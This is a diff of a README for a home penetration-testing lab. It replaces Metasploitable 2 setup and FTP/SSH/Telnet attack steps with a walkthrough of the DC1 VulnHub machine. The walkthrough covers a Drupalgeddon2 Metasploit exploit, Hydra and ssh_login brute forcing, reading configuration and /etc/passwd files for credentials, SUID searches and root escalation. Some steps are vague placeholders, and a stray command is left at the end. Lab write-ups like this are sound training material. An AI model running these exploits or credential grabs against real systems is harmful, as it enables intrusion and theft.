@@ -1,253 +1,176 @@
-Home Hacking Lab Project
+Home Hacking Lab: DC1 VulnHub Machine Exploitation
 Description:
-This project consisted of setting up a comprehensive home penetration testing lab using VirtualBox. The lab includes virtual machines such as Kali Linux, Metasploitable 2, and DC1 from VulnHub. The primary objective is to practice and enhance cybersecurity skills through hands-on exercises in vulnerability scanning, exploitation, and post-exploitation techniques.
+This section of the home hacking lab project focuses on downloading and exploiting the DC1 VulnHub machine. The primary objective is to practice and enhance cybersecurity skills through hands-on exercises in vulnerability scanning, exploitation, and post-exploitation techniques, culminating in the capture of multiple flags.
 
 Apps, Languages, & Utilities Used:
 
 Virtualization Software: VirtualBox
-Operating Systems: Kali Linux, Metasploitable 2, DC1 VulnHub machine
-Security Tools: Metasploit, nmap, Hydra, Wireshark
+Operating Systems: Kali Linux, DC1 VulnHub machine
+Security Tools: Metasploit, nmap, Hydra, LinPEAS, MySQL
 Scripting: Bash
 Environments Used:
 
 Kali Linux: Attacker Machine
-Metasploitable 2: Vulnerable Linux VM
 DC1 VulnHub Machine: Vulnerable VM
-Testing Tools:
-
-Hydra: Used for brute-force attacks
-Metasploit: Used for various exploits and vulnerabilities
-Wireshark: Used for network traffic analysis
 Objective:
-The objective of the lab is to provide a hands-on learning experience in setting up a virtualized environment for cybersecurity testing and exploration. By installing and configuring multiple virtual machines (VMs) including Kali Linux, Metasploitable 2, and DC1 from VulnHub, the lab aims to teach skills such as network configuration, vulnerability scanning, service exploitation, and post-exploitation analysis. This lab setup helps in understanding how attackers compromise systems and how to detect and mitigate such attacks.
+The objective is to exploit the DC1 VulnHub machine by identifying and capturing flags, thereby gaining practical experience in cybersecurity concepts, tools, and techniques.
 
 Skills Learned:
 
-Setting up VMs (Kali Linux, Metasploitable 2, DC1) in Oracle VM VirtualBox.
-Configuring IP addresses, NAT Networks for VMs.
+Setting up VMs in Oracle VM VirtualBox.
 Performing vulnerability scanning using nmap.
-Exploiting services (FTP, SSH, Telnet) using Metasploit.
+Exploiting web application vulnerabilities using Metasploit.
 Brute-forcing login credentials using Hydra.
-Capturing and analyzing network traffic using Wireshark.
-Performing privilege escalation and capturing flags on vulnerable machines.
+Capturing and analyzing database credentials.
+Performing privilege escalation and capturing flags on a vulnerable machine.
 Documenting and reporting exploitation techniques.
+Steps Taken:
 
+Download and Setup DC1 VulnHub Machine
+Download DC1 Machine from VulnHub:
 
-Part 1: How To Install VirtualBox On Windows 11
-Objective: Install VirtualBox on Windows 11 for creating and managing virtual machines.
+Navigate to VulnHub and search for DC1 or go directly to the DC1 VulnHub page.
+Download the DC1 machine and extract the contents.
+Import the DC1 Machine into VirtualBox:
 
-Download VirtualBox:
-
-Open a web browser and navigate to the Oracle VirtualBox download page.
-Select the Windows installer and download the file.
-Install VirtualBox:
-
-Locate the downloaded installer and double-click to start the installation.
-Follow the prompts, accepting defaults, and acknowledging any warnings about network interfaces.
-Complete the installation but do not start VirtualBox immediately.
-Download and Install Extension Pack:
-
-Download the Extension Pack from the same VirtualBox download page.
-Install the Extension Pack by double-clicking the downloaded file and following the prompts.
-Part 2: How to Install Kali Linux 2022.4 in VirtualBox
-Objective: Download and install Kali Linux 2022.4 as a virtual machine in VirtualBox.
-
-Download Kali Linux VM:
-
-Open a web browser and navigate to the Kali Linux download page.
-Select the VirtualBox image and download the file.
-Extract the Downloaded File:
-
-Extract the contents of the downloaded file to a preferred location on your computer.
-Import the Kali Linux VM into VirtualBox:
-
-Open VirtualBox.
-Go to File > Import Appliance and select the extracted Kali Linux file.
-Follow the prompts to complete the import.
-Configure the Kali Linux VM:
-
-Adjust settings such as memory (4GB recommended), processors (2 CPUs), and network adapter (NAT Network).
-Verify Network Configuration:
-
-Start the Kali Linux VM and log in.
-Open a terminal and run ifconfig to check the IP address.
-Ensure the VM has internet connectivity by pinging a website.
-Part 3: How to Install PimpMyKali in Kali Linux
-Objective: Enhance the Kali Linux setup using the PimpMyKali script to optimize and fix issues.
-
-Download PimpMyKali Script:
-
-Open a web browser and navigate to the PimpMyKali GitHub repository.
-Copy the repository URL for cloning.
-Clone the Repository:
-
-Open a terminal in Kali Linux and switch to the root user.
-Create a directory for tools and clone the repository:
-bash
-Copy code
-sudo su
-mkdir /root/tools
-cd /root/tools
-git clone https://github.com/Dewalt-arch/pimpmykali.git
-Run the PimpMyKali Script:
-
-Navigate into the cloned directory and make the script executable:
-bash
-Copy code
-cd pimpmykali
-chmod +x pimpmykali.sh
-./pimpmykali.sh
-Follow the prompts, selecting options such as new VM setup and enabling root login if desired.
-Complete the setup and reboot the system.
-Part 4: How To Install Metasploitable 2 in VirtualBox
-Objective: Install Metasploitable 2, a deliberately vulnerable Linux VM, in VirtualBox.
-
-Download Metasploitable 2:
-
-Open a web browser and navigate to SourceForge.
-Download the Metasploitable 2 zip file and extract its contents.
-Create a New Virtual Machine in VirtualBox:
-
-Open VirtualBox and create a new VM named MS2 for Metasploitable 2.
-Set the type to Linux and version to Other Linux (64-bit).
-Use an existing virtual hard disk file and select the extracted Metasploitable 2 VMDK file.
+Open VirtualBox and go to File > Import Appliance.
+Select the extracted DC1 file and follow the prompts to complete the import.
 Configure Network Settings:
 
 Adjust the network adapter to NAT Network and select the appropriate network.
-Start the Metasploitable 2 VM:
+Start the DC1 VM:
 
-Boot up the VM and log in using the default credentials (msfadmin / msfadmin).
-Part 5: How To Hack and Exploit Port 21 FTP on Metasploitable 2
-Objective: Exploit the FTP service on Metasploitable 2 to gain unauthorized access.
+Boot up the DC1 VM and ensure it is running properly.
+Exploitation of DC1 VulnHub Machine
+Flag 1: Initial Enumeration and Exploitation
+Objective: Identify and capture the first flag by exploiting the web application.
 
-Scan for Open Ports and Services:
+Verify DC1 Machine is Running:
 
-Use nmap to identify open ports and services on Metasploitable 2:
+Ensure the DC1 machine is up and running by pinging its IP address:
 bash
 Copy code
-nmap -p- -sV -oN ms2.txt 10.0.200.5
-Create User and Password Lists:
+ping 10.0.200.6
+Information Gathering:
 
-Create files with potential usernames and passwords:
+Perform an nmap scan to identify open ports and services:
 bash
 Copy code
-nano users.txt
-msfadmin
-service
-user
-guest
-nano passwords.txt
-msfadmin
-service
-user
-guest
-Brute Force FTP Credentials Using Hydra:
+nmap -A -sC -oN dc.txt 10.0.200.6
+Enumerate the Web Application:
 
-Use Hydra to perform a brute force attack on the FTP service:
-bash
-Copy code
-hydra -L users.txt -P passwords.txt ftp://10.0.200.5
-Exploit FTP Vulnerability Using Metasploit:
-
-Use Metasploit to exploit the vsftpd 2.3.4 vulnerability:
+Access the web application running on port 80 and identify that it is using Drupal.
+Use Metasploit to find and exploit vulnerabilities in Drupal:
 bash
 Copy code
 msfconsole
-search vsftpd
-use exploit/unix/ftp/vsftpd_234_backdoor
-set RHOSTS 10.0.200.5
-exploit
-Part 6: How To Hack and Exploit Port 22 SSH on Metasploitable 2
-Objective: Exploit the SSH service on Metasploitable 2 to gain unauthorized access.
+search drupal
+use exploit/unix/webapp/drupal_drupalgeddon2
+set RHOSTS 10.0.200.6
+run
+Capture Initial Flag:
 
-Discover Metasploitable 2 IP Address:
-
-Identify the IP address using netdiscover:
+Once you gain a shell, navigate the file system to find the first flag:
 bash
 Copy code
-netdiscover -r 10.0.200.0/24
-Scan for Open Ports and Services:
+find / -name flag1.txt
+cat /path/to/flag1.txt
+Flag 1 Content: "Every good CMS needs a config file."
+Flag 2: Database Enumeration and Exploitation
+Objective: Identify and capture the second flag by exploiting the database.
 
-Use nmap to scan for SSH service:
+Identify Configuration Files:
+
+Use the hint from Flag 1 to locate the Drupal configuration file:
 bash
 Copy code
-nmap -p- -sV -oN ms2.txt 10.0.200.5
-Create User and Password Lists:
+cat /var/www/html/sites/default/settings.php
+Find Database Credentials:
 
-Create files with potential usernames and passwords:
+Extract database credentials from the configuration file.
+Connect to the Database:
+
+Use the credentials to connect to the MySQL database:
 bash
 Copy code
-nano users.txt
-msfadmin
-service
-user
-guest
-nano passwords.txt
-msfadmin
-service
-user
-guest
-Brute Force SSH Credentials Using Metasploit:
+mysql -u dbuser -p
+Enumerate Database and Capture Flag:
 
-Use Metasploit to perform a brute force attack on SSH:
+Enumerate the database to find the second flag:
 bash
 Copy code
-msfconsole
-search ssh_login
-use auxiliary/scanner/ssh/ssh_login
-set RHOSTS 10.0.200.5
-set USER_FILE /root/users.txt
-set PASS_FILE /root/passwords.txt
-set STOP_ON_SUCCESS true
-exploit
-Verify Access and Interact with the Session:
+show databases;
+use drupal;
+show tables;
+select * from flags;
+Flag 2 Content: "Brute force and directory attacks aren't the only way to gain access."
+Flag 3: Privilege Escalation and System Enumeration
+Objective: Identify and capture the third flag by performing privilege escalation.
 
-Interact with the session opened by Metasploit:
+Identify Weak Configurations:
+
+Search for files with weak permissions or misconfigurations that could allow privilege escalation:
 bash
 Copy code
-sessions -i 1
-sysinfo
-Part 7: How To Hack and Exploit Port 23 Telnet on Metasploitable 2
-Objective: Exploit the Telnet service on Metasploitable 2 to capture and analyze network traffic.
+find / -perm -4000 -type f 2>/dev/null
+Exploit Weakness:
 
-Discover Metasploitable 2 IP Address:
-
-Identify the IP address using netdiscover:
+Use tools like GTFOBins to escalate privileges:
 bash
 Copy code
-netdiscover -r 10.0.200.0/24
-Scan for Open Ports and Services:
+/path/to/vulnerable_binary
+Capture Third Flag:
 
-Use nmap to scan for Telnet service:
+Once privileges are escalated, navigate the file system to find the third flag:
 bash
 Copy code
-nmap -p- -sV -oN ms2.txt 10.0.200.5
-Capture Telnet Traffic Using Wireshark:
+find / -name flag3.txt
+cat /path/to/flag3.txt
+Flag 3 Content: "There's more than one way to skin a cat."
+Flag 4: User Enumeration and Exploitation
+Objective: Identify and capture the fourth flag by exploiting user credentials.
 
-Open Wireshark and start capturing traffic on the network interface connected to Metasploitable 2.
-Generate Telnet traffic by logging into Metasploitable 2:
+Enumerate Users:
+
+List all users on the system and look for interesting files in their home directories:
 bash
 Copy code
-telnet 10.0.200.5
-msfadmin
-msfadmin
-Stop the capture and analyze the traffic to find cleartext credentials.
-Exploit Telnet Using Metasploit:
+cat /etc/passwd
+ls /home
+Check for Reused Passwords:
 
-Use Metasploit to exploit the Telnet service:
+Try using previously discovered passwords to switch to different users:
 bash
 Copy code
-msfconsole
-search telnet_login
-use auxiliary/scanner/telnet/telnet_login
-set RHOSTS 10.0.200.5
-set USERNAME msfadmin
-set PASSWORD msfadmin
-exploit
-Verify Access and Interact with the Session:
+su - username
+Capture Fourth Flag:
 
-Interact with the session opened by Metasploit:
+Navigate the user's home directory to find the fourth flag:
 bash
 Copy code
+find /home -name flag4.txt
+cat /path/to/flag4.txt
+Flag 4 Content: "You can use the same method to find or access the root flag."
+Final Flag: Root Privilege Escalation
+Objective: Identify and capture the final flag by gaining root access.
+
+Identify Privilege Escalation Vector:
+
+Look for misconfigurations or software vulnerabilities that allow root access.
+Use tools like LinPEAS or manual enumeration to identify vectors.
+Exploit and Gain Root Access:
+
+Perform the privilege escalation to gain root access:
+bash
+Copy code
+/path/to/exploit
+Capture Final Flag:
+
+Navigate to the root directory and find the final flag:
+bash
+Copy code
+cd /root
+cat final_flag.txt
+Final Flag Content: "Well done! You have completed the DC1 challenge."
 sessions -i 1
 sysinfo
